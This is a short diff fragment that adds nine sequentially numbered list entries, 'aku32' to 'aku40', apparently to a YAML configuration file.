+            - aku32
+            - aku33
+            - aku34
+            - aku35
+            - aku36
+            - aku37
+            - aku38
+            - aku39
+            - aku40
